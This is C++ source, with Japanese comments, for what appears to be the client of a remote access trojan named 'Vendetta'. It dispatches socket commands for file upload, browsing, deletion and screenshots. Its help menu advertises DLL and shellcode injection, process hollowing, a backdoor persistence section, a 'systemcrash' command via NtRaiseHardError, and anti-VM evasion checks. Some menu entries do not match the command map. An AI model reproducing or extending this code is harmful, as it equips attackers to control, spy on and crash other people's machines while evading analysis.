#include "Vendetta.h"

// グローバル変数定義
SOCKET mainSocket;

std::set<std::string> helpOptions = { "-h", "h", "help", "-help", "--help" };
const std::string newline = "\r\n";

// コマンドと対応する関数のマップ
std::map<std::string, CommandFunction> commandMap = {
    {"mb", ShowMessageBox},
    {"up", UploadFile},
    {"ls", Dir},
    {"cd",Cd},
    {"cat",Cat},
    {"mkdir",MkDir},
    {"rmdir",Rmdir},
    {"pwd", Pwd},
    {"cp", Copy},
    {"mv", Move},
    {"touch", Touch},
    {"write", Write},
    {"ps", ProcessList},
    {"help", Help},
    {"h", Help },
    {"rm", Remove },
    {"netstat", Netstat },
    {"screenshot",screenshot },
    {"dllinject" ,DllInjection},
    {"frefinject",FilelessReflectiveDLLInjection},
    {"systemcrash",SystemCrash}
};

// stringからwstringへの変換
std::wstring ConvertToWString(const std::string& str) {
    int size_needed = MultiByteToWideChar(CP_UTF8, 0, str.c_str(), static_cast<int>(str.size()), NULL, 0);
    std::wstring wstr(size_needed, 0);
    MultiByteToWideChar(CP_UTF8, 0, str.c_str(), static_cast<int>(str.size()), &wstr[0], size_needed);
    return wstr;
}

// wstringからstringへの変換
std::string convertToString(const std::wstring& wstr) {
    int size_needed = WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), static_cast<int>(wstr.size()), NULL, 0, NULL, NULL);
    std::string str(size_needed, 0);
    WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), static_cast<int>(wstr.size()), &str[0], size_needed, NULL, NULL);
    return str;
}

// メッセージを送信
void SendString(const std::string& message) {
    std::string msg = message + "\n";
    int totalSent = 0;
    int msgLength = static_cast<int>(msg.size());

    while (totalSent < msgLength) {
        int bytesSent = send(mainSocket, msg.c_str() + totalSent, msgLength - totalSent, 0);
        if (bytesSent == SOCKET_ERROR) {
            closesocket(mainSocket);
            return;
        }
        totalSent += bytesSent;
    }
}

// コマンドの内容をトークンに分割
std::vector<std::string> ParseCommand(const std::string& input) {
    std::vector<std::string> tokens;
    std::stringstream stream(input);
    std::string token;

    while (stream >> token) {
        tokens.push_back(token);
    }
    return tokens;
}

// コマンドを実行
void ExecuteCommand(std::vector<std::string>& tokens) {
    if (!tokens.empty()) {
        std::string command = tokens[0];
        auto it = commandMap.find(command);
        if (it != commandMap.end()) {
            it->second(tokens);
        }
        else {
            return;
        }
    }
}

// シェルの権限を確認
bool IsUserAnAdmin() {
    BOOL isAdmin = FALSE;
    PSID administratorsGroup = NULL;
    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
    AllocateAndInitializeSid(&NtAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &administratorsGroup);
    CheckTokenMembership(NULL, administratorsGroup, &isAdmin);
    return isAdmin == TRUE;
}

// 現在のユーザー名を取得
std::string GetCurrentUsername() {
    char username[UNLEN + 1];
    DWORD username_len = UNLEN + 1;
    if (GetUserNameA(username, &username_len)) {
        return std::string(username);
    }
    else {
        return "";
    }
}

// カレントディレクトリを送信
void SendPrompt(SOCKET mainSocket) {
    const DWORD bufferSize = MAX_PATH;
    char currentDir[bufferSize];

    DWORD result = GetCurrentDirectoryA(bufferSize, currentDir);
    if (result > 0 && result < bufferSize) {
        std::string username = GetCurrentUsername(); // ユーザー名を取得
        bool isAdmin = IsUserAnAdmin(); // 権限の確認
        std::string adminIndicator = isAdmin ? "Administrator" : "User";

        // プロンプト形式の構築
        std::string message = "\n┌──(" + username + "@" + adminIndicator + ")-[" + currentDir + "]\n" + "└─" + (isAdmin ? "Vendetta #" : "Vendetta $ ");
        send(mainSocket, message.c_str(), static_cast<int>(message.size()), 0);
    }
    else {
        exit(1);
    }
}


// helpコマンド
void Help(std::vector<std::string>& tokens) {
    // 列幅の定義
    const int commandWidth = 40;
    const int descriptionWidth = 80;

    std::ostringstream helpText;

    // コマンドと説明のペアを定義
    struct CommandHelp {
        std::string command;
        std::string description;
    };

    // メインコマンド セクション
    helpText << "標準コマンド\n"
        << "==============\n\n"
        << std::left << std::setw(commandWidth) << "Command"
        << "Description\n"
        << std::setw(commandWidth) << "-------"
        << "-----------\n";

    std::vector<CommandHelp> commands = {
        {"help", "コマンドヘルプを表示"},
        {"netstat", "ネットワーク接続の一覧を表示"},
        {"ps", "実行中のプロセス一覧を表示"},
        {"kill", "指定したPIDのプロセスを終了"},
        {"pwd", "現在の作業ディレクトリを表示"},
        {"cd", "作業ディレクトリを変更"},
        {"ls", "ファイルとディレクトリの一覧を表示"},
        {"cat", "ファイルの内容を表示"},
        {"mkdir", "新しいディレクトリを作成"},
        {"rm", "ファイルまたはディレクトリを削除"},
        {"cp", "ファイルまたはディレクトリをコピー"},
        {"mv", "ファイルまたはディレクトリを移動/名前変更"},
    };

    // コマンドを順番に表示
    for (const auto& cmd : commands) {
        helpText << std::left
            << std::setw(commandWidth) << cmd.command
            << cmd.description << "\n";
    }

    helpText << "\nプロセスインジェクション\n"
        << "=======================\n\n"
        << std::left << std::setw(commandWidth) << "コマンド"
        << "説明\n"
        << std::setw(commandWidth) << "-------"
        << "-----------\n";

    std::vector<CommandHelp> processInjectionCommands = {
        {"dlliject", "DLLインジェクションを実行"},
        {"shellcodeinject", "シェルコードインジェクションを実行"},
        {"acpinject", "非同期プロシージャ呼び出しによるDLLインジェクションを実行"},
        {"hijackinject", "スレッドハイジャックによるDLLインジェクションを実行"},
        {"refinject", "反射型DLLインジェクションを実行"},
        {"hollowinject", "プロセスハロウィングを実行"},
        {"flrefinject", "ファイルレスで反射型DLLインジェクションを実行"},
        {"flshellcodeinject", "ファイルレスでシェルコードインジェクションを実行"},
        {"flhollowinject", "ファイルレスでプロセスハロウィングを実行"},
    };

    for (const auto& cmd : processInjectionCommands) {
        helpText << std::left
            << std::setw(commandWidth) << cmd.command
            << cmd.description << "\n";
    }


    helpText << "\nバックドア（持続性メカニズム）\n"
        << "================\n\n"
        << std::left << std::setw(commandWidth) << "Command"
        << "Description\n"
        << std::setw(commandWidth) << "-------"
        << "-----------\n";

    std::vector<CommandHelp> backdoorCommands = {
        {"ipconfig", "ネットワークインターフェース情報を表示"},
        {"netstat", "ネットワーク接続とポートの状態を表示"},
        {"route", "ルーティングテーブルを表示"},
        {"ping", "指定したホストへの到達性をテスト"},
        {"tracert", "指定したホストまでの経路を表示"},
        {"nslookup", "DNSクエリを実行"}
    };

    // ネットワークコマンドを順番に表示
    for (const auto& cmd : backdoorCommands) {
        helpText << std::left
            << std::setw(commandWidth) << cmd.command
            << cmd.description << "\n";
    }


    helpText << "\nその他\n"
        << "================\n\n"
        << std::left << std::setw(commandWidth) << "Command"
        << "Description\n"
        << std::setw(commandWidth) << "-------"
        << "-----------\n";

    std::vector<CommandHelp> mayhemCommands = {
        {"gdieffect", "GDIエフェクトを10秒間表示"},
        {"systemcrash", "危険: NtRaiseHardErrorを直接呼び出してシステムクラッシュ"},

    };

    // ネットワークコマンドを順番に表示
    for (const auto& cmd : mayhemCommands) {
        helpText << std::left
            << std::setw(commandWidth) << cmd.command
            << cmd.description << "\n";
    }

    SendString(helpText.str());
}

void AntiVM() {
    CheckRegistry();
    CheckBIOS();
    CheckProcesses();
    CheckDrivers();
}